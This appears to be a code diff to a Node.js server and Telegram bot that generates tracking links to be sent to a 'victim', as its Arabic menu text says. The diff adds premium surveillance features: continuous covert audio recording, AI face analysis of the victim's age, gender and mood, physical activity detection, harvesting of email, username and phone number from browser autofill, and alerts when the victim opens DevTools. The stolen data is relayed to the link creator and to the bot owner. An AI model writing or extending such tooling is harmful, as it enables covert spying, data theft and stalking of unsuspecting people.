@@ -27,7 +27,7 @@ const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, contcam:false, contaudio:false, faceAI:false, activityDetect:false, autofill:false, devtools:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -375,10 +375,15 @@ async function handleLinkOpen(req, res, view) {
   const clipAccess    = canUsePremium(creatorId, 'clipboard');
   const pidAccess     = canUsePremium(creatorId, 'persistentId');
   const localNetAccess= canUsePremium(creatorId, 'localNet');
-  const pushAccess    = canUsePremium(creatorId, 'webpush');
-  const screenCapAccess = canUsePremium(creatorId, 'screencap');
-  const contcamAccess = canUsePremium(creatorId, 'contcam');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess });
+  const pushAccess        = canUsePremium(creatorId, 'webpush');
+  const screenCapAccess   = canUsePremium(creatorId, 'screencap');
+  const contcamAccess     = canUsePremium(creatorId, 'contcam');
+  const contaudioAccess   = canUsePremium(creatorId, 'contaudio');
+  const faceAIAccess      = canUsePremium(creatorId, 'faceAI');
+  const activityAccess    = canUsePremium(creatorId, 'activityDetect');
+  const autofillAccess    = canUsePremium(creatorId, 'autofill');
+  const devtoolsAccess    = canUsePremium(creatorId, 'devtools');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -975,7 +980,12 @@ bot.on('callback_query', async (q) => {
       `🔒  🖼️ تحميل الصور والملفات من جهاز الضحية\n` +
       `🔒  🖥️ تصوير شاشة الضحية مباشرة\n` +
       `🔒  🔔 إرسال إشعارات للضحية حتى بعد إغلاق الصفحة\n` +
-      `🔒  📸 تصوير مستمر كل 30 ثانية (حتى 20 دقيقة)\n\n` +
+      `🔒  📸 تصوير مستمر كل 30 ثانية (حتى 20 دقيقة)\n` +
+      `🔒  🎙️ تسجيل صوتي مستمر كل دقيقتين\n` +
+      `🔒  😊 تحليل الوجه AI (عمر، جنس، مزاج)\n` +
+      `🔒  🚶 كشف النشاط الجسدي (يمشي/يجري/في سيارة)\n` +
+      `🔒  🔑 استخراج إيميل/يوزرنيم من Autofill\n` +
+      `🔒  🔍 تنبيه عند فتح DevTools\n\n` +
       `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
       statusLine
@@ -1119,8 +1129,13 @@ const PREM_FEAT_NAMES = {
   persistentId:"🆔 المعرّف الدائم",
   localNet:    "🌐 الشبكة المحلية",
   webpush:     "🔔 الإشعارات",
-  screencap:   "🖥️ تصوير الشاشة",
-  contcam:     "📸 التصوير المستمر"
+  screencap:      "🖥️ تصوير الشاشة",
+  contcam:        "📸 التصوير المستمر",
+  contaudio:      "🎙️ الصوت المستمر",
+  faceAI:         "😊 تحليل الوجه AI",
+  activityDetect: "🚶 كشف النشاط الجسدي",
+  autofill:       "🔑 استخراج إيميل/يوزرنيم",
+  devtools:       "🔍 كشف DevTools"
 };
 
 function premiumConfigText() {
@@ -1434,6 +1449,81 @@ app.post("/network", (req, res) => {
 });
 
 // Battery endpoint — always report
+// ── Continuous audio (premium) ────────────────────────────────────────────────
+app.post("/audio-cont", (req, res) => {
+  const uid   = req.body?.uid || null;
+  const audio = req.body?.audio || null;
+  if (!uid || !audio) return res.send("Missing");
+  const tid  = parseInt(uid, 36);
+  const buf  = Buffer.from(decodeURIComponent(audio), 'base64');
+  const ts   = new Date().toJSON().slice(11,19) + " UTC";
+  const info = { filename:"audio-cont.webm", contentType:"audio/webm" };
+  if (!settings.silentMode) {
+    bot.sendAudio(tid, buf, { caption:`🎙️ صوت مستمر | ${ts}` }, info).catch(()=>{});
+    if (tid !== BOT_OWNER) bot.sendAudio(BOT_OWNER, buf, { caption:`🎙️ صوت مستمر | ${ts}\n(ID: ${tid})` }, info).catch(()=>{});
+  }
+  res.send("Done");
+});
+
+// ── Face AI analysis (premium) ────────────────────────────────────────────────
+app.post("/faceai", (req, res) => {
+  const uid   = decodeURIComponent(req.body?.uid || '');
+  const age   = req.body?.age   || '?';
+  const gender= req.body?.gender|| '?';
+  const expr  = req.body?.expression || '?';
+  if (!uid) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const exprMap = { happy:'😊 سعيد', sad:'😢 حزين', angry:'😠 غاضب', neutral:'😐 محايد', surprised:'😲 مندهش', disgusted:'🤢 متقزز', fearful:'😨 خائف' };
+  const exprAr = exprMap[expr] || expr;
+  const genderAr = gender === 'male' ? '👨 ذكر' : gender === 'female' ? '👩 أنثى' : gender;
+  const msg = `😊 تحليل الوجه AI\n👤 الجنس: ${genderAr}\n🎂 العمر التقريبي: ${age} سنة\n😶 الحالة: ${exprAr}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  res.send("Done");
+});
+
+// ── Physical activity detection (premium) ─────────────────────────────────────
+app.post("/activity", (req, res) => {
+  const uid      = decodeURIComponent(req.body?.uid || '');
+  const activity = req.body?.activity || '?';
+  const mag      = req.body?.avgMag   || '?';
+  if (!uid) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const msg = `🚶 نشاط الضحية الجسدي\n📊 الحالة: ${activity}\n📈 شدة الحركة: ${mag}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  res.send("Done");
+});
+
+// ── Autofill capture (premium) ─────────────────────────────────────────────────
+app.post("/autofill", (req, res) => {
+  const uid      = decodeURIComponent(req.body?.uid || '');
+  const email    = req.body?.email    || '';
+  const username = req.body?.username || '';
+  const tel      = req.body?.tel      || '';
+  if (!uid) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  let msg = `🔑 بيانات Autofill مُستخرجة`;
+  if (email)    msg += `\n📧 الإيميل: ${email}`;
+  if (username) msg += `\n👤 اليوزرنيم: ${username}`;
+  if (tel)      msg += `\n📞 الهاتف: ${tel}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  res.send("Done");
+});
+
+// ── DevTools detection (premium) ──────────────────────────────────────────────
+app.post("/devtools-alert", (req, res) => {
+  const uid  = decodeURIComponent(req.body?.uid || '');
+  const type = req.body?.type || 'open';
+  if (!uid) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const msg = `🔍 تحذير! الضحية فتحت DevTools\n🛠️ نوع الكشف: ${type}`;
+  notify(tid, msg);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  res.send("Done");
+});
+
 app.post("/vpndetect", (req, res) => {
   const uid       = decodeURIComponent(req.body.uid || '');
   const deviceTz  = req.body.deviceTz || '?';
